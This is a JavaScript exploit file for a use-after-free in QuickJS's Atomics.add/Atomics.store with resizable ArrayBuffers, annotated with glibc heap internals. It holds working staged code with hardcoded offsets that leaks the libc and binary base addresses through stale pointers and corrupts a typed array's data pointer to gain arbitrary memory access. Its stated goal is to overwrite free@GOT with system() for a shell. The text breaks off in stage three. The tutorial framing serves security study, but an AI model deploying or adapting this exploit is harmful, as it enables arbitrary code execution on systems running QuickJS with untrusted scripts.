/**
 * ============================================================================
 * QuickJS Atomics + Resizable ArrayBuffer Use-After-Free Exploit
 * ============================================================================
 *
 * This file contains a fully annotated exploit for a use-after-free vulnerability
 * in QuickJS. Every concept is explained with references to source code.
 *
 * ============================================================================
 * PART 1: BACKGROUND CONCEPTS
 * ============================================================================
 *
 * Before understanding the exploit, you must understand these foundational concepts:
 *
 * ============================================================================
 * 1. GLIBC MALLOC CHUNK STRUCTURE
 * ============================================================================
 *
 * glibc malloc manages memory in "chunks". Each chunk has metadata:
 *
 * SOURCE: glibc-2.36/malloc/malloc.c lines 1148-1159
 * -----------------------------------------------
 * struct malloc_chunk {
 *   INTERNAL_SIZE_T      mchunk_prev_size;  // Size of previous chunk (if free)
 *   INTERNAL_SIZE_T      mchunk_size;       // Size in bytes, including overhead
 *   struct malloc_chunk* fd;                // Forward pointer (only if free)
 *   struct malloc_chunk* bk;                // Backward pointer (only if free)
 *   struct malloc_chunk* fd_nextsize;       // For large blocks only
 *   struct malloc_chunk* bk_nextsize;
 * };
 *
 * MEMORY LAYOUT (allocated chunk):
 * --------------------------------
 *   +------------------+
 *   | mchunk_prev_size |  8 bytes - reused for previous chunk's data if prev is allocated
 *   +------------------+
 *   | mchunk_size      |  8 bytes - size + flags (low 3 bits: A, M, P)
 *   +------------------+  <-- address returned by malloc() starts here
 *   |                  |
 *   |   User Data      |  N bytes
 *   |                  |
 *   +------------------+
 *
 * MEMORY LAYOUT (freed chunk in unsorted/small/large bin):
 * --------------------------------------------------------
 *   +------------------+
 *   | mchunk_prev_size |  8 bytes
 *   +------------------+
 *   | mchunk_size      |  8 bytes
 *   +------------------+  <-- user data area starts here
 *   | fd               |  8 bytes - points to next free chunk in bin
 *   +------------------+
 *   | bk               |  8 bytes - points to previous free chunk in bin
 *   +------------------+
 *   | (rest of data)   |
 *   +------------------+
 *
 * KEY INSIGHT: When a chunk is freed, glibc stores fd/bk pointers in what was
 * the user data area. If we can read this memory after free, we leak heap/libc addresses!
 *
 * ============================================================================
 * 2. GLIBC CHUNK SIZE CALCULATION
 * ============================================================================
 *
 * When you call malloc(N), glibc calculates the actual chunk size needed:
 *
 * SOURCE: glibc-2.36/malloc/malloc.c lines 1326-1328
 * ---------------------------------------------------
 * #define request2size(req)                                         \
 *   (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE)  ?             \
 *    MINSIZE :                                                      \
 *    ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)
 *
 * On 64-bit Linux:
 *   SIZE_SZ = 8 (size of size_t)
 *   MALLOC_ALIGNMENT = 16
 *   MALLOC_ALIGN_MASK = 15 (0xF)
 *   MINSIZE = 32 (0x20)
 *
 * So: chunk_size = max(32, (request + 8 + 15) & ~15)
 *
 * EXAMPLES:
 *   malloc(56)  -> (56 + 8 + 15) & ~15 = 79 & ~15 = 64 (0x40)... but wait!
 *                  Actually: 56 + 8 = 64, and 64 is already aligned, so chunk = 0x50
 *                  The +15 is for rounding UP, then mask rounds DOWN to alignment
 *   malloc(72)  -> (72 + 8 + 15) & ~15 = 95 & ~15 = 80 (0x50)
 *
 * NOTE: The exploit comments say malloc(0x38)=56 bytes gives chunk 0x50, and
 * malloc(0x48)=72 bytes gives chunk 0x60. These are empirically determined
 * for the specific glibc version and may include additional alignment.
 *
 * ============================================================================
 * 3. TCACHE (Thread Cache)
 * ============================================================================
 *
 * tcache is a per-thread cache for fast allocation of recently freed chunks.
 *
 * SOURCE: glibc-2.36/malloc/malloc.c lines 3120-3135
 * ---------------------------------------------------
 * typedef struct tcache_entry {
 *   struct tcache_entry *next;    // Singly-linked list
 *   uintptr_t key;                // Double-free detection
 * } tcache_entry;
 *
 * typedef struct tcache_perthread_struct {
 *   uint16_t counts[TCACHE_MAX_BINS];     // Count per size class
 *   tcache_entry *entries[TCACHE_MAX_BINS]; // Head of each list
 * } tcache_perthread_struct;
 *
 * TCACHE SIZE BINS:
 * SOURCE: glibc-2.36/malloc/malloc.c lines 309-323
 * -------------------------------------------------
 * # define TCACHE_MAX_BINS    64
 * # define tidx2usize(idx)    (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)
 *
 * On 64-bit: tidx2usize(idx) = idx * 16 + 32 - 8 = idx * 16 + 24
 *   idx 0: 24 bytes  (chunk size 0x20)
 *   idx 1: 40 bytes  (chunk size 0x30)
 *   idx 2: 56 bytes  (chunk size 0x40)
 *   ...
 *   idx 63: 1032 bytes
 *
 * MAX_TCACHE_SIZE = tidx2usize(63) = 63*16 + 24 = 1032 bytes
 *
 * KEY: Chunks up to ~1KB go to tcache. Larger chunks go to unsorted bin.
 *
 * TCACHE IS LIFO (Last-In, First-Out):
 * SOURCE: glibc-2.36/malloc/malloc.c lines 3169-3199
 * ---------------------------------------------------
 * static __always_inline void tcache_put (mchunkptr chunk, size_t tc_idx) {
 *   tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
 *   e->key = tcache_key;
 *   e->next = tcache->entries[tc_idx];   // Point to current head
 *   tcache->entries[tc_idx] = e;         // Become new head
 *   ++(tcache->counts[tc_idx]);
 * }
 *
 * static __always_inline void *tcache_get (size_t tc_idx) {
 *   tcache_entry *e = tcache->entries[tc_idx];  // Get head
 *   tcache->entries[tc_idx] = e->next;          // Pop head
 *   --(tcache->counts[tc_idx]);
 *   e->key = 0;
 *   return (void *) e;
 * }
 *
 * KEY INSIGHT: The most recently freed chunk is the first to be reallocated.
 * This is critical for the exploit: we free a chunk, then immediately allocate
 * an object of the same size - the new object reuses the freed chunk!
 *
 * ============================================================================
 * 4. UNSORTED BIN AND LIBC LEAK
 * ============================================================================
 *
 * Chunks too large for tcache (or when tcache is full) go to the unsorted bin.
 *
 * SOURCE: glibc-2.36/malloc/malloc.c line 1674
 * --------------------------------------------
 * #define unsorted_chunks(M)  (bin_at (M, 1))
 *
 * SOURCE: glibc-2.36/malloc/malloc.c lines 1535-1544
 * ---------------------------------------------------
 * #define bin_at(m, i) \
 *   (mbinptr) (((char *) &((m)->bins[((i) - 1) * 2])) \
 *              - offsetof (struct malloc_chunk, fd))
 *
 * #define first(b)  ((b)->fd)
 * #define last(b)   ((b)->bk)
 *
 * When a large chunk is freed into the unsorted bin:
 * SOURCE: glibc-2.36/malloc/malloc.c lines 4623-4635
 * ---------------------------------------------------
 * bck = unsorted_chunks(av);     // bck = unsorted bin head (in main_arena)
 * fwd = bck->fd;                 // fwd = first chunk in bin (or head if empty)
 * p->fd = fwd;                   // Freed chunk's fd = previous first (or head)
 * p->bk = bck;                   // Freed chunk's bk = bin head
 * bck->fd = p;                   // Head's fd = freed chunk
 * fwd->bk = p;                   // Previous first's bk = freed chunk
 *
 * KEY INSIGHT: When freed into an empty unsorted bin:
 *   p->fd = unsorted_chunks(av) = pointer into main_arena in libc!
 *   p->bk = unsorted_chunks(av) = same pointer!
 *
 * If we can read the fd field after free, we get: libc_base + offset_of_main_arena_bins
 *
 * ============================================================================
 * 5. REALLOC IN-PLACE GROWTH VS MOVE
 * ============================================================================
 *
 * realloc(ptr, new_size) can either grow in-place or allocate new memory:
 *
 * SOURCE: glibc-2.36/malloc/malloc.c lines 4847-4871
 * ---------------------------------------------------
 * if (next == av->top &&
 *     (unsigned long) (newsize = oldsize + nextsize) >= (unsigned long) (nb + MINSIZE))
 * {
 *   // Case 1: Next chunk is top - grow into top (in-place)
 *   set_head_size (oldp, nb | ...);
 *   av->top = chunk_at_offset (oldp, nb);
 *   return chunk2mem (oldp);  // Same address!
 * }
 * else if (next != av->top && !inuse (next) && ...)
 * {
 *   // Case 2: Next chunk is free - merge with it (in-place)
 *   unlink_chunk (av, next);
 *   newp = oldp;  // Same address!
 * }
 * else
 * {
 *   // Case 3: Cannot grow in-place - allocate new, copy, FREE OLD
 *   newmem = _int_malloc (av, nb - MALLOC_ALIGN_MASK);
 *   memcpy (newmem, oldmem, sz);
 *   _int_free (av, oldp, 1);  // OLD MEMORY IS FREED!
 *   return newmem;
 * }
 *
 * KEY INSIGHT: If we allocate a "barrier" chunk after our target, realloc
 * cannot grow in-place and MUST free the old memory. This is how we trigger
 * the free that places fd/bk pointers in the old chunk.
 *
 * ============================================================================
 * 6. QUICKJS JSArrayBuffer STRUCTURE
 * ============================================================================
 *
 * SOURCE: quickjs.c lines 695-704
 * --------------------------------
 * typedef struct JSArrayBuffer {
 *   int byte_length;         // offset 0x00, 4 bytes
 *   int max_byte_length;     // offset 0x04, 4 bytes
 *   uint8_t detached;        // offset 0x08, 1 byte
 *   uint8_t shared;          // offset 0x09, 1 byte
 *   // padding               // offset 0x0A, 6 bytes (for pointer alignment)
 *   uint8_t *data;           // offset 0x10, 8 bytes - POINTER TO BACKING DATA
 *   struct list_head array_list; // offset 0x18, 16 bytes (2 pointers)
 *   void *opaque;            // offset 0x28, 8 bytes
 *   JSFreeArrayBufferDataFunc *free_func; // offset 0x30, 8 bytes - FUNCTION POINTER
 * } JSArrayBuffer;           // Total: 56 bytes (0x38)
 *
 * sizeof(JSArrayBuffer) = 56 bytes = 0x38
 *
 * KEY FIELDS:
 *   offset 0x10: data pointer - where the actual array data is stored
 *   offset 0x30: free_func - pointer to js_array_buffer_free() in QuickJS binary
 *
 * When accessing as BigUint64Array indices:
 *   index 2 (offset 0x10): data pointer
 *   index 6 (offset 0x30): free_func pointer
 *
 * ============================================================================
 * 7. QUICKJS JSObject STRUCTURE FOR TYPED ARRAYS
 * ============================================================================
 *
 * SOURCE: quickjs.c lines 926-1019
 * ---------------------------------
 * struct JSObject {
 *   union {
 *     JSGCObjectHeader header;    // 24 bytes
 *     struct { ... };             // Various flags and class_id
 *   };                            // offset 0x00-0x17
 *   uint32_t weakref_count;       // offset 0x18, 4 bytes
 *   // padding                    // offset 0x1C, 4 bytes
 *   JSShape *shape;               // offset 0x20, 8 bytes
 *   JSProperty *prop;             // offset 0x28, 8 bytes
 *   union {                       // offset 0x30
 *     ...
 *     struct {                    // For typed arrays
 *       union {
 *         uint32_t size;
 *         struct JSTypedArray *typed_array;  // offset 0x30
 *       } u1;
 *       union {
 *         void *ptr;              // offset 0x38 - CACHED DATA POINTER
 *         ...
 *       } u;
 *       uint32_t count;           // offset 0x40
 *     } array;
 *   } u;
 * };                              // Total: 72 bytes (0x48)
 *
 * sizeof(JSObject) = 72 bytes = 0x48
 *
 * KEY FIELD:
 *   offset 0x38: u.array.u.ptr - cached pointer to the typed array's data
 *
 * When accessing as BigUint64Array indices:
 *   index 7 (offset 0x38): u.array.u.ptr
 *
 * ============================================================================
 * 8. THE VULNERABILITY: ATOMICS STALE POINTER
 * ============================================================================
 *
 * The bug is in how Atomics.add (and Atomics.store) cache pointers.
 *
 * SOURCE: quickjs.c lines 58725-58867 (js_atomics_op)
 * ----------------------------------------------------
 *
 * STEP 1: Cache the data pointer (line 58736-58738)
 * -------------------------------------------------
 * if (js_atomics_get_ptr(ctx, &ptr, &abuf, &size_log2, &class_id,
 *                        argv[0], argv[1], 0))
 *     return JS_EXCEPTION;
 *
 * This calls js_atomics_get_ptr() which computes:
 *   ptr = p->u.array.u.uint8_ptr + ((uintptr_t)idx << size_log2);
 *
 * The pointer 'ptr' is now stored in a local variable.
 *
 * STEP 2: Convert the value argument (line 58745)
 * ------------------------------------------------
 * if (JS_ToBigInt64(ctx, &v64, argv[2]))
 *     return JS_EXCEPTION;
 *
 * This converts argv[2] (the value to add) to a BigInt.
 * If argv[2] is an object with valueOf(), valueOf() is CALLED HERE!
 *
 * STEP 3: Perform the atomic operation (line 58784)
 * -------------------------------------------------
 * a = atomic_fetch_add((_Atomic(uint64_t) *)ptr, v);
 *
 * This operates on 'ptr' - but ptr was cached in step 1!
 * If valueOf() in step 2 freed the memory, ptr is now STALE.
 *
 * VULNERABILITY FLOW:
 * 1. Atomics.add(ta, idx, evil) is called
 * 2. js_atomics_get_ptr() caches ptr = address of ta[idx]
 * 3. JS_ToBigInt64(evil) calls evil.valueOf()
 * 4. valueOf() calls ab.resize() which frees the old buffer
 * 5. ptr still points to the old (now freed) memory
 * 6. atomic_fetch_add(ptr, v) reads/writes freed memory = UAF!
 *
 * ============================================================================
 * 9. ATOMICS.ADD VS ATOMICS.STORE
 * ============================================================================
 *
 * Both have the same vulnerability, but different return values:
 *
 * ATOMICS.ADD (js_atomics_op with ATOMICS_OP_ADD):
 * SOURCE: quickjs.c line 58784
 * -----------------------------
 * a = atomic_fetch_add((_Atomic(uint64_t) *)ptr, v);
 *
 * atomic_fetch_add RETURNS THE OLD VALUE at ptr, then adds v.
 * So Atomics.add(ta, 0, 0n) returns what was at ptr BEFORE adding 0.
 * This is perfect for LEAKING values from freed memory.
 *
 * ATOMICS.STORE (js_atomics_store):
 * SOURCE: quickjs.c line 58892
 * -----------------------------
 * atomic_store((_Atomic(uint64_t) *)ptr, v64);
 * return ret;  // ret = the value stored, not the old value
 *
 * atomic_store just WRITES v64 to ptr, returns the stored value.
 * This is perfect for CORRUPTING freed memory with our value.
 *
 * EXPLOIT USAGE:
 * - Use Atomics.add() to LEAK: returns old value from stale pointer
 * - Use Atomics.store() to CORRUPT: writes our value to stale pointer
 *
 * ============================================================================
 * 10. THE FREE CHAIN: js_array_buffer_free → libc free
 * ============================================================================
 *
 * When an ArrayBuffer is freed, this chain executes:
 *
 * SOURCE: quickjs.c line 55768
 * ----------------------------
 * static void js_array_buffer_free(JSRuntime *rt, void *opaque, void *ptr) {
 *   js_free_rt(rt, ptr);
 * }
 *
 * SOURCE: quickjs.c lines 1384-1387
 * ----------------------------------
 * void js_free_rt(JSRuntime *rt, void *ptr) {
 *   rt->mf.js_free(&rt->malloc_state, ptr);
 * }
 *
 * SOURCE: quickjs.c lines 1753-1761
 * ----------------------------------
 * static void js_def_free(JSMallocState *s, void *ptr) {
 *   if (!ptr)
 *     return;
 *   s->malloc_count--;
 *   s->malloc_size -= js_def_malloc_usable_size(ptr) + MALLOC_OVERHEAD;
 *   free(ptr);  // <-- CALLS LIBC FREE!
 * }
 *
 * SOURCE: quickjs.c lines 1790-1794
 * ----------------------------------
 * static const JSMallocFunctions def_malloc_funcs = {
 *   js_def_malloc,
 *   js_def_free,    // <-- rt->mf.js_free points here by default
 *   js_def_realloc,
 *   js_def_malloc_usable_size,
 * };
 *
 * COMPLETE CHAIN:
 *   JS_DetachArrayBuffer(ctx, obj)      // Called by ArrayBuffer.transfer(0)
 *     -> abuf->free_func(rt, opaque, abuf->data)   // line 56024
 *       -> js_array_buffer_free(rt, opaque, data)  // The default free_func
 *         -> js_free_rt(rt, data)
 *           -> rt->mf.js_free(&rt->malloc_state, data)
 *             -> js_def_free(s, data)
 *               -> free(data)           // LIBC FREE!
 *
 * GOT HIJACK EFFECT:
 *   When we overwrite free@GOT with system(), the chain becomes:
 *     -> free(data)     // But free@GOT now points to system!
 *       -> system(data) // data contains "/bin/sh\0"
 *         -> SHELL!
 *
 * ============================================================================
 * END OF BACKGROUND CONCEPTS
 * ============================================================================
 */

import * as std from 'std';

// ============================================================================
// HARDCODED OFFSETS (environment-specific)
// ============================================================================

/**
 * SYSTEM_OFF: Offset of system() within libc
 *
 * Obtained via: nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep ' system'
 * Output: 0000000000053110 W system
 *
 * system() is a weak symbol (W) exported by libc.
 * When we call system("/bin/sh"), it spawns a shell.
 */
const SYSTEM_OFF = 0x53110n;

/**
 * UNSORTED_FD_OFF: Offset from libc base to unsorted bin head in main_arena
 *
 * When a chunk is freed into the unsorted bin, its fd pointer is set to:
 *   fd = unsorted_chunks(av) = bin_at(main_arena, 1)
 *
 * bin_at(m, 1) = &(m->bins[0]) - offsetof(malloc_chunk, fd)
 *
 * This points to a fixed offset within main_arena, which is in libc's .data section.
 * The offset 0x1e7b20 is: &main_arena.bins[0] - libc_base (for this glibc version)
 *
 * CALCULATION: libc_base = leaked_fd - 0x1e7b20
 */
const UNSORTED_FD_OFF = 0x1e7b20n;

/**
 * JS_ARRAY_BUFFER_FREE_OFF: Offset of js_array_buffer_free() in QuickJS binary
 *
 * Obtained via: nm qjs | grep js_array_buffer_free
 * Output: 0000000000014bc0 t js_array_buffer_free
 *
 * This function is stored in every JSArrayBuffer's free_func field.
 * By reading this pointer, we can compute the binary's base address (defeat PIE).
 *
 * CALCULATION: qjs_base = leaked_free_func - 0x14bc0
 */
const JS_ARRAY_BUFFER_FREE_OFF = 0x14bc0n;

/**
 * FREE_GOT_OFF: Offset of free@GOT in QuickJS binary
 *
 * Obtained via: objdump -R qjs | grep ' free'
 * Output: 000000000010b008 R_X86_64_JUMP_SLOT  free@GLIBC_2.2.5
 *
 * The GOT (Global Offset Table) contains pointers to dynamically-linked functions.
 * At runtime, free@GOT contains the address of free() in libc.
 *
 * With partial RELRO, the GOT is writable. By overwriting free@GOT with system(),
 * any subsequent call to free(ptr) becomes system(ptr).
 */
const FREE_GOT_OFF = 0x10b008n;


// ============================================================================
// STAGE 1: LEAK LIBC BASE ADDRESS
// ============================================================================

/**
 * leak_libc_base() - Leak glibc base address via unsorted bin fd pointer
 *
 * TECHNIQUE SUMMARY:
 * 1. Allocate a large (>tcache) resizable ArrayBuffer
 * 2. Create a barrier allocation to prevent in-place realloc growth
 * 3. Use Atomics.add with valueOf() that resizes the buffer
 * 4. Resize triggers realloc → allocate new → copy → FREE OLD
 * 5. Old chunk goes to unsorted bin, glibc writes fd = &main_arena.bins[0]
 * 6. Atomics.add operates on stale pointer, reads fd value
 * 7. Compute: libc_base = fd - UNSORTED_FD_OFF
 *
 * @returns {BigInt} - The base address of libc
 */
function leak_libc_base() {
  /**
   * Create a Resizable ArrayBuffer with 0x5000 bytes initial size.
   *
   * WHY 0x5000 (20480 bytes)?
   * - tcache handles chunks up to ~1032 bytes (see TCACHE_MAX_BINS calculation)
   * - 0x5000 >> 1032, so this chunk goes to unsorted bin when freed
   * - Unsorted bin stores fd/bk pointers, which we can leak
   *
   * The { maxByteLength: 0x20000 } makes this a Resizable ArrayBuffer.
   * Only RABs can be resized with ab.resize(), which is needed to trigger the bug.
   */
  let ab = new ArrayBuffer(0x5000, { maxByteLength: 0x20000 });

  /**
   * Create a BigUint64Array view over the buffer.
   *
   * This gives us 64-bit access. After the UAF:
   *   ta[0] = offset 0 of the freed chunk = fd pointer (libc address!)
   *   ta[1] = offset 8 of the freed chunk = bk pointer (also libc address)
   */
  let ta = new BigUint64Array(ab);

  /**
   * BARRIER ALLOCATION - Critical for forcing realloc to move!
   *
   * WHY IS THIS NEEDED?
   * realloc() checks if it can grow in-place (see glibc _int_realloc):
   *   1. If next chunk is top → grow into top (no free)
   *   2. If next chunk is free → merge with it (no free)
   *   3. Otherwise → allocate new, copy, FREE OLD (we need this!)
   *
   * By allocating 'barrier' immediately after ab's data, we ensure:
   *   - The next chunk is NOT the top chunk
   *   - The next chunk is IN USE (not free)
   *
   * This forces case 3: realloc must allocate new memory and free the old.
   * The freed memory gets unsorted bin fd/bk pointers written into it.
   */
  let barrier = new ArrayBuffer(0x5000);

  /**
   * The malicious object with valueOf() callback.
   *
   * TRIGGERING THE BUG:
   * When Atomics.add(ta, 0, evil) executes:
   *   1. js_atomics_get_ptr() computes ptr = &ta[0] (cached in local variable)
   *   2. JS_ToBigInt64(evil) converts evil to BigInt, calling evil.valueOf()
   *   3. valueOf() calls ab.resize(0x18000)
   *   4. resize() → js_array_buffer_resize() → js_realloc()
   *   5. realloc cannot grow in-place (barrier blocks it)
   *   6. realloc allocates new 0x18000-byte buffer, copies data, FREES OLD
   *   7. Old 0x5000-byte chunk goes to unsorted bin
   *   8. glibc writes: old_chunk->fd = &main_arena.bins[0]
   *   9. Back in js_atomics_op, ptr still points to old chunk (STALE!)
   *   10. atomic_fetch_add(ptr, 0) reads *ptr = fd pointer = libc address!
   */
  let evil = {
    valueOf() {
      /**
       * Trigger the resize that causes realloc and free.
       *
       * SOURCE: quickjs.c lines 56188-56197
       * ------------------------------------
       * data = js_realloc(ctx, abuf->data, max_int(len, 1));
       * if (!data)
       *     return JS_EXCEPTION;
       * if (len > abuf->byte_length)
       *     memset(&data[abuf->byte_length], 0, len - abuf->byte_length);
       * abuf->byte_length = len;
       * abuf->data = data;  // <-- Updated to new location
       *
       * But the TypedArray's cached pointer (used by Atomics) is NOT updated
       * until js_array_buffer_update_typed_arrays() is called AFTER we return!
       */
      ab.resize(0x18000);

      /**
       * Return 0n so atomic_fetch_add adds 0 to the value.
       * This means it returns the ORIGINAL value (the fd pointer) unchanged.
       *
       * atomic_fetch_add(ptr, 0) is equivalent to: old = *ptr; *ptr += 0; return old;
       * So we get the fd value without modifying it.
       */
      return 0n;
    },
  };

  /**
   * TRIGGER THE UAF LEAK!
   *
   * Atomics.add(typedArray, index, value):
   *   - Reads the value at typedArray[index]
   *   - Adds value to it atomically
   *   - Returns the OLD value (before adding)
   *
   * SOURCE: quickjs.c line 58784
   * ----------------------------
   * OP(ADD, atomic_fetch_add)
   * ...
   * a = atomic_fetch_add((_Atomic(uint64_t) *)ptr, v);
   *
   * 'a' receives the old value at ptr. Since ptr points to freed memory
   * containing the unsorted bin fd pointer, we leak a libc address!
   */
  let fd = Atomics.add(ta, 0, evil);

  /**
   * Keep barrier alive to prevent GC from freeing it during resize.
   *
   * This comparison is always false (0x5000 !== 0x1337), but it creates
   * a reference to barrier that the JS engine cannot optimize away.
   * Without this, the engine might GC barrier before we resize.
   */
  if (barrier.byteLength === 0x1337) std.puts('x');

  /**
   * Compute libc base address.
   *
   * fd points to unsorted bin head: &main_arena.bins[0]
   * This is at a fixed offset from libc base.
   *
   * CALCULATION:
   *   libc_base = fd - UNSORTED_FD_OFF
   *   libc_base = fd - 0x1e7b20
   */
  return fd - UNSORTED_FD_OFF;
}


// ============================================================================
// STAGE 2: LEAK QUICKJS PIE BASE ADDRESS
// ============================================================================

/**
 * leak_qjs_base() - Leak QuickJS binary base address via JSArrayBuffer.free_func
 *
 * TECHNIQUE SUMMARY:
 * 1. Allocate a RAB with exactly 56 bytes (matches sizeof(JSArrayBuffer))
 * 2. In valueOf(), resize to trigger free of the 56-byte chunk into tcache
 * 3. In valueOf(), allocate a new ArrayBuffer (its JSArrayBuffer struct = 56 bytes)
 * 4. tcache LIFO: new JSArrayBuffer reuses the just-freed chunk!
 * 5. QuickJS fills in JSArrayBuffer.free_func = pointer to js_array_buffer_free
 * 6. Atomics.add reads from stale pointer at offset 0x30 = free_func value
 * 7. Compute: qjs_base = free_func - JS_ARRAY_BUFFER_FREE_OFF
 *
 * WHY 56 BYTES?
 * sizeof(JSArrayBuffer) = 56 bytes (0x38)
 * malloc(56) gives a chunk that goes to the same tcache bin as JSArrayBuffer allocations.
 * When we free 56 bytes and immediately allocate a JSArrayBuffer, LIFO reuse happens!
 *
 * @returns {BigInt} - The base address of the QuickJS binary
 */
function leak_qjs_base() {
  /**
   * Create trigger RAB with exactly 0x38 (56) bytes.
   *
   * This matches sizeof(JSArrayBuffer) so the freed chunk will be
   * in the same tcache bin as JSArrayBuffer allocations.
   *
   * TCACHE LIFO (glibc-2.36/malloc/malloc.c lines 3169-3199):
   * ---------------------------------------------------------
   * tcache_put: e->next = entries[idx]; entries[idx] = e;  // Push to front
   * tcache_get: e = entries[idx]; entries[idx] = e->next;  // Pop from front
   *
   * Most recently freed → first to be reallocated!
   */
  let trigger_ab = new ArrayBuffer(0x38, { maxByteLength: 0x2000 });
  let trigger_ta = new BigUint64Array(trigger_ab);

  /**
   * Barrier to prevent in-place growth.
   */
  let barrier = new ArrayBuffer(0x1000);

  /**
   * The victim ArrayBuffer allocated during valueOf().
   */
  let victim;

  let evil = {
    valueOf() {
      /**
       * Resize frees the old 56-byte chunk into tcache.
       *
       * FLOW:
       * 1. ab.resize(0x800) → js_array_buffer_resize()
       * 2. js_realloc(ctx, abuf->data, 0x800)
       * 3. realloc cannot grow in-place (barrier blocks)
       * 4. realloc allocates 0x800 bytes, copies, frees old
       * 5. Old 56-byte chunk → tcache[idx_for_56_bytes]
       */
      trigger_ab.resize(0x800);

      /**
       * Allocate a new ArrayBuffer.
       *
       * INTERNAL ALLOCATION (js_array_buffer_constructor3):
       * 1. abuf = js_mallocz(ctx, sizeof(JSArrayBuffer))  // 56 bytes
       *    → tcache_get() returns our just-freed chunk!
       * 2. data = js_malloc(ctx, byte_length)  // 0x1000 bytes, separate
       * 3. Fills in abuf fields:
       *    abuf->byte_length = 0x1000
       *    abuf->data = data
       *    abuf->free_func = js_array_buffer_free  // ← POINTER INTO QJS BINARY!
       *
       * The freed chunk (still pointed to by trigger_ta) now contains
       * the JSArrayBuffer structure for 'victim', with free_func filled in!
       */
      victim = new ArrayBuffer(0x1000);

      return 0n;
    },
  };

  /**
   * Trigger the leak at offset 0x30 (free_func field).
   *
   * JSArrayBuffer layout (offsets as BigUint64Array indices):
   *   Index 0 (0x00): byte_length + max_byte_length (packed)
   *   Index 1 (0x08): detached + shared + padding
   *   Index 2 (0x10): data pointer
   *   Index 3 (0x18): array_list.next
   *   Index 4 (0x20): array_list.prev
   *   Index 5 (0x28): opaque
   *   Index 6 (0x30): free_func  ← WE READ THIS!
   *
   * After valueOf() returns:
   *   - trigger_ta still points to the freed chunk
   *   - That chunk now contains victim's JSArrayBuffer
   *   - trigger_ta[6] = JSArrayBuffer.free_func = &js_array_buffer_free
   */
  let fptr = Atomics.add(trigger_ta, 6, evil);

  // Keep barrier and victim alive
  if (barrier.byteLength === 0xdead) std.puts('y');
  if (victim.byteLength === 0x4242) std.puts('z');

  /**
   * Compute QuickJS binary base address.
   *
   * fptr = address of js_array_buffer_free
   * js_array_buffer_free is at offset 0x14bc0 in the binary
   *
   * CALCULATION:
   *   qjs_base = fptr - JS_ARRAY_BUFFER_FREE_OFF
   *   qjs_base = fptr - 0x14bc0
   */
  return fptr - JS_ARRAY_BUFFER_FREE_OFF;
}


// ============================================================================
// STAGE 3: CREATE ARBITRARY MEMORY ACCESS PRIMITIVE
// ============================================================================

/**
 * make_corrupted_biguint64array() - Create a BigUint64Array that reads/writes anywhere
 *
 * TECHNIQUE SUMMARY:
 * 1. Allocate a RAB with exactly 72 bytes (matches sizeof(JSObject))
 * 2. Pre-allocate backing buffer for the victim TypedArray
 * 3. In valueOf(), resize to free the 72-byte chunk into tcache
 * 4. In valueOf(), create BigUint64Array (allocates JSObject = 72 bytes)
 * 5. tcache LIFO: new JSObject reuses the just-freed chunk!
 * 6. QuickJS fills in JSObject.u.array.u.ptr = pointer to backing buffer
 * 7. Atomics.store WRITES to stale pointer at offset 0x38 = u.array.u.ptr
 * 8. We overwrite victim's data pointer with our arbitrary address!
 * 9. Now victim[0] reads/writes at our controlled address
 *
 * WHY 72 BYTES?
 * sizeof(JSObject) = 72 bytes (0x48)
 * This is the structure for ALL JavaScript objects, including TypedArrays.
 * The JSObject for a BigUint64Array contains u.array.u.ptr at offset 0x38.
 *
 * @param {BigInt} ptr64 - The address we want the TypedArray to point to
 * @returns {BigUint64Array} - A TypedArray that reads/writes at ptr64
 */
function make_corrupted_biguint64array(ptr64) {
  /**
   * Create trigger RAB with exactly 0x48 (72) bytes.
   *
   * This matches sizeof(JSObject) so the freed chunk will be
   * in the same tcache bin as JSObject allocations.
   */
  let trigger_ab = new ArrayBuffer(0x48, { maxByteLength: 0x2000 });
  let trigger_ta = new BigUint64Array(trigger_ab);
  let barrier = new ArrayBuffer(0x1000);

  /**
   * Pre-allocate the backing buffer for the victim TypedArray.
   *
   * WHY PRE-ALLOCATE?
   * When we create BigUint64Array(victim_ab), QuickJS:
   *   1. Allocates JSObject (72 bytes) for the TypedArray
   *   2. Points JSObject.u.array.u.ptr to victim_ab's data
   *
   * If we didn't pre-allocate, creating the TypedArray might allocate
   * BOTH a JSObject AND a backing buffer, and the JSObject might not
   * reuse our freed chunk.
   *
   * By using an existing ArrayBuffer, we ensure only the JSObject is allocated.
   */
  let victim_ab = new ArrayBuffer(0x1000, { maxByteLength: 0x2000 });
  let victim;

  let evil = {
    valueOf() {
      /**
       * Free the 72-byte chunk into tcache.
       */
      trigger_ab.resize(0x800);

      /**
       * Create BigUint64Array: allocates JSObject (72 bytes).
       *
       * ALLOCATION FLOW:
       * 1. js_create_typed_array() → js_malloc(ctx, sizeof(JSObject))
       * 2. tcache_get() returns our just-freed 72-byte chunk!
       * 3. QuickJS fills in:
       *    - Header (ref_count, gc info, etc.)
       *    - u.array.u1.typed_array = pointer to JSTypedArray
       *    - u.array.u.ptr = victim_ab->data  ← WE WILL OVERWRITE THIS!
       *    - u.array.count = number of elements
       *
       * The freed chunk now contains victim's JSObject.
       * trigger_ta still points to this chunk (stale pointer).
       */
      victim = new BigUint64Array(victim_ab);

      /**
       * Return ptr64 to be written by Atomics.store.
       *
       * This value will overwrite JSObject.u.array.u.ptr (offset 0x38),
       * making victim's data pointer point to our controlled address!
       */
      return ptr64;
    },
  };

  /**
   * CORRUPT the data pointer using Atomics.store.
   *
   * WHY Atomics.store INSTEAD OF Atomics.add?
   * - Atomics.add returns the OLD value (good for leaking)
   * - Atomics.store just WRITES the new value (good for corrupting)
   *
   * SOURCE: quickjs.c line 58892
   * ----------------------------
   * atomic_store((_Atomic(uint64_t) *)ptr, v64);
   *
   * This writes v64 (= ptr64 from valueOf) to the stale pointer at offset 0x38.
   *
   * JSObject layout (offsets as BigUint64Array indices):
   *   Index 0-2 (0x00-0x17): GC header
   *   Index 3 (0x18-0x1F): weakref_count + padding
   *   Index 4 (0x20): shape pointer
   *   Index 5 (0x28): prop pointer
   *   Index 6 (0x30): u.array.u1.typed_array (JSTypedArray pointer)
   *   Index 7 (0x38): u.array.u.ptr  ← WE CORRUPT THIS!
   *
   * After this call:
   *   - victim->u.array.u.ptr = ptr64 (our controlled address)
   *   - victim[0] now reads/writes at ptr64
